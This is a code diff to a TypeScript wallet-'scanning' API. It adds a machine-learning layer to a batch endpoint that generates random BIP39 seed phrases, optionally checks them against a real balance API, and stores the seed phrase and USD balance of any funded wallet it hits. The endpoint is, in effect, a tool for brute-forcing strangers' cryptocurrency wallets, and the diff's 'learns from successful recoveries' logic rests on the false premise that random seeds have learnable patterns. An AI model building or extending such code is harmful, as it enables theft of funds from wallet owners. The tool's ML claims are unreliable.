@@ -5,6 +5,7 @@ import * as crypto from './lib/crypto'
 import * as bip39 from './lib/bip39'
 import * as walletGen from './lib/wallet-generator'
 import * as dbHelper from './lib/db-helper'
+import * as mlLearning from './lib/ml-learning'
 
 type Bindings = {
   DB: D1Database
@@ -200,9 +201,21 @@ app.post('/api/wallet/batch-scan', async (c) => {
   let scanId: number | null = null
   
   try {
-    const { count = 10, wordCount = 12, walletType = 'both', useRealAPI = false, apiKey, userId = 1, saveToDb = true } = await c.req.json()
+    const { 
+      count = 10, 
+      wordCount = 12, 
+      walletType = 'both', 
+      useRealAPI = false, 
+      apiKey, 
+      userId = 1, 
+      saveToDb = true,
+      useML = false,
+      mlStrategy = 'adaptive'
+    } = await c.req.json()
     
-    console.log('[API] Batch scan started:', { count, wordCount, walletType, useRealAPI, saveToDb })
+    console.log('[API] Batch scan started:', { 
+      count, wordCount, walletType, useRealAPI, saveToDb, useML, mlStrategy 
+    })
     
     if (count < 1 || count > 1000) {
       return c.json({ error: 'Count must be between 1 and 1000' }, 400)
@@ -223,6 +236,23 @@ app.post('/api/wallet/batch-scan', async (c) => {
     
     console.log('[API] DB available:', !!db)
     
+    // Load ML state if ML is enabled
+    let mlState: mlLearning.MLState | undefined
+    if (useML && db) {
+      try {
+        mlState = await mlLearning.initializeMLState(db)
+        const stats = mlLearning.getMLStats(mlState)
+        console.log('[API] ML enabled:', { 
+          learnedWords: stats.learnedWords,
+          successRate: stats.successRate.toFixed(4),
+          strategy: mlStrategy 
+        })
+      } catch (mlError) {
+        console.error('[API] ML initialization failed, falling back to random:', mlError)
+        mlState = undefined
+      }
+    }
+    
     // Create scan record (if DB persistence enabled)
     if (saveToDb && db) {
       try {
@@ -231,7 +261,7 @@ app.post('/api/wallet/batch-scan', async (c) => {
           user_id: userId,
           mode: 'batch_scan',
           input_type: 'random_generation',
-          input_value: `Batch scan: ${count} wallets, ${wordCount} words, ${walletType}`,
+          input_value: `Batch scan: ${count} wallets, ${wordCount} words, ${walletType}${useML ? ` (ML: ${mlStrategy})` : ''}`,
           wallet_type: walletType as any,
           word_count: wordCount,
           status: 'running',
@@ -248,10 +278,52 @@ app.post('/api/wallet/batch-scan', async (c) => {
     }
     
     const startTime = Date.now()
-    const result = await walletGen.batchScan(count, wordCount, walletType, useRealAPI, apiKey)
+    const result = await walletGen.batchScan(
+      count, 
+      wordCount, 
+      walletType, 
+      useRealAPI, 
+      apiKey,
+      undefined, // onProgress callback
+      mlState,    // ML state
+      mlStrategy as any  // ML strategy
+    )
     const stats = walletGen.calculateScanStats(startTime, result.totalScanned, result.totalFound)
     
-    console.log('[API] Scan completed:', { totalScanned: result.totalScanned, totalFound: result.totalFound })
+    console.log('[API] Scan completed:', { 
+      totalScanned: result.totalScanned, 
+      totalFound: result.totalFound,
+      strategyUsed: result.strategyUsed 
+    })
+    
+    // Learn from successful recoveries and update ML state
+    if (useML && mlState && db && result.foundWallets.length > 0) {
+      try {
+        for (const wallet of result.foundWallets) {
+          mlLearning.learnFromSuccess(
+            mlState,
+            wallet.seedPhrase,
+            wallet.type,
+            parseFloat(wallet.balanceUSD)
+          )
+        }
+        // Update attempts
+        mlLearning.updateAttempts(mlState, result.totalScanned)
+        // Save ML state
+        await mlLearning.saveMLState(db, mlState)
+        console.log('[API] ML state updated with', result.foundWallets.length, 'successful recoveries')
+      } catch (mlError) {
+        console.error('[API] Failed to update ML state:', mlError)
+      }
+    } else if (useML && mlState && db) {
+      // Update attempts even if no successes
+      try {
+        mlLearning.updateAttempts(mlState, result.totalScanned)
+        await mlLearning.saveMLState(db, mlState)
+      } catch (mlError) {
+        console.error('[API] Failed to update ML attempts:', mlError)
+      }
+    }
     
     // Update scan with results (if DB persistence enabled)
     if (saveToDb && db && scanId) {
@@ -284,6 +356,12 @@ app.post('/api/wallet/batch-scan', async (c) => {
       }
     }
     
+    // Get ML stats for response
+    let mlStats
+    if (useML && mlState) {
+      mlStats = mlLearning.getMLStats(mlState)
+    }
+    
     return c.json({
       success: true,
       scanId, // Return scan ID for history tracking
@@ -296,7 +374,14 @@ app.post('/api/wallet/batch-scan', async (c) => {
         scannedPerSecond: stats.scannedPerSecond,
         elapsedTime: stats.elapsedTime,
         successRate: stats.successRate
-      }
+      },
+      ml: useML ? {
+        enabled: true,
+        strategyUsed: result.strategyUsed,
+        learnedWords: mlStats?.learnedWords || 0,
+        totalSuccesses: mlStats?.totalSuccesses || 0,
+        mlSuccessRate: mlStats?.successRate || 0
+      } : { enabled: false }
     })
   } catch (error) {
     console.error('[API] Batch scan error:', error)
@@ -343,6 +428,49 @@ app.get('/api/scans/stats', async (c) => {
   } catch (error) {
     console.error('[API] Get stats error:', error)
     return c.json({ error: 'Failed to retrieve scan statistics' }, 500)
+  }
+})
+
+// Get ML statistics
+app.get('/api/ml/stats', async (c) => {
+  try {
+    const db = c.env.DB
+    const mlState = await mlLearning.initializeMLState(db)
+    const stats = mlLearning.getMLStats(mlState)
+    
+    return c.json({
+      success: true,
+      ml: {
+        totalSuccesses: stats.totalSuccesses,
+        totalAttempts: stats.totalAttempts,
+        successRate: stats.successRate,
+        learnedWords: stats.learnedWords,
+        learnedPositions: stats.learnedPositions,
+        learnedPairs: stats.learnedPairs,
+        recommendedStrategy: stats.recommendedStrategy,
+        efficiency: stats.efficiency,
+        lastUpdated: mlState.lastUpdated
+      }
+    })
+  } catch (error) {
+    console.error('[API] Get ML stats error:', error)
+    return c.json({ error: 'Failed to retrieve ML statistics' }, 500)
+  }
+})
+
+// Reset ML state (for testing)
+app.post('/api/ml/reset', async (c) => {
+  try {
+    const db = c.env.DB
+    await mlLearning.resetMLState(db)
+    
+    return c.json({
+      success: true,
+      message: 'ML state has been reset'
+    })
+  } catch (error) {
+    console.error('[API] Reset ML error:', error)
+    return c.json({ error: 'Failed to reset ML state' }, 500)
   }
 })
 
